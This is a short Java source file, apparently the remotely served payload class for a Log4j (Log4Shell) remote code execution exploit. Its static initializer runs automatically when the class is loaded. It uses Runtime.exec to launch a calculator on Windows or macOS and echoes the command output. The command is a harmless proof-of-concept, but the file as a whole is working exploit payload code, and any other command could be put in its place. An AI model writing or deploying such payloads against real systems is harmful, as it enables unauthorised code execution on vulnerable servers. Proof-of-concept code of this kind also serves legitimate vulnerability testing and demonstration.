import java.io.BufferedReader;    
import java.io.IOException;    
import java.io.InputStream;    
import java.io.InputStreamReader;    
   
public class Log4jRCE {    
    static {
        System.out.println("I am Log4jRCE from remote!!!");
        try {
          Process p;
          String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                         ? new String[]{"cmd.exe","/c", "calc.exe"}
                         : new String[]{"open","/System/Applications/Calculator.app"};
            p = java.lang.Runtime.getRuntime().exec(cmds);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);    
            BufferedReader br = new BufferedReader(isr);    
            String line = null; 
            while((line=br.readLine())!=null) {
                 System.out.println(line);
            }
        }    
        catch (IOException e) {    
             e.printStackTrace();
        }
     }    
}